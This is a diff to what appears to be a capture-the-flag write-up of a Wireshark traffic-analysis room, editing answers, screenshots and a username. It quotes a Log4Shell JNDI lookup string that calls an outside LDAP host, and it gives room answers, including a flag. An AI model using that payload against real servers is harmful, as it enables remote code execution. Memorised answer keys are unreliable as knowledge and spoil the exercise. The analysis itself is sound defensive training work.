@@ -210,7 +210,7 @@ Filter: `http.user_agent`, then visually scanned for UA strings that don't match
 
 ![Anomalous Windows NT 6.4 user-agent strings highlighted](/assets/img/thm-Wireshark-traffic-analysis/anomolous-user-agent.png)
 
-**A: `5`** — five packets carry the fabricated `Windows NT 6.4` user-agent string.
+**A: `6`** — six packets carry the fabricated `Windows NT 6.4` user-agent string.
 
 ---
 
@@ -228,7 +228,7 @@ Same approach — looked for a UA string mimicking `Mozilla/5.0` with a single s
 
 Filter: `(http.user_agent contains "$") or (http.user_agent contains "==")`
 
-![Log4j JNDI payload in the User-Agent header](/assets/img/thm-Wireshark-traffic-analysis/base64-starting-phase.png)
+![Log4j JNDI payload in the User-Agent header](/assets/img/thm-Wireshark-traffic-analysis/first-packet.png)
 
 **A: `444`** — the User-Agent header contains `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/...}`, the JNDI lookup that kicks off the Log4Shell exploit chain.
 
@@ -237,6 +237,8 @@ Filter: `(http.user_agent contains "$") or (http.user_agent contains "==")`
 **Q: Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (defanged, exclude `{}`)**
 
 Extracted the base64 blob from packet 444's payload and ran it through CyberChef's **From Base64** recipe.
+
+![Log4j JNDI payload in the User-Agent header](/assets/img/thm-Wireshark-traffic-analysis/base64-starting-phase.png)
 
 ![CyberChef decoding the base64 Log4j payload](/assets/img/thm-Wireshark-traffic-analysis/base64-decode.png)
 
@@ -284,6 +286,10 @@ Expanded the decrypted HTTP2 headers on frame 322.
 
 Used **File → Export Objects → HTTP** to pull the object served from `situla.bitbit.net`, saved it, and opened it in a text editor.
 
+![Exported object opened in text editor, revealing the flag](/assets/img/thm-Wireshark-traffic-analysis/finding-flag-1.png)
+
+![Exported object opened in text editor, revealing the flag](/assets/img/thm-Wireshark-traffic-analysis/finding-flag-2.png)
+
 ![Exported object opened in text editor, revealing the flag](/assets/img/thm-Wireshark-traffic-analysis/flag-found.png)
 
 **A: `FLAG{THM-PACKETMASTER}`**
@@ -308,7 +314,7 @@ Same Credentials window, cross-referenced with the FTP `PASS` command in packet 
 
 ![Empty FTP PASS command](/assets/img/thm-Wireshark-traffic-analysis/no-pass.png)
 
-**A: `170`** — `PASS` sent with no argument, tied to the `adminis...` username registered in packet 136.
+**A: `170`** — `PASS` sent with no argument, tied to the `administrator` username registered in packet 136.
 
 ---
 
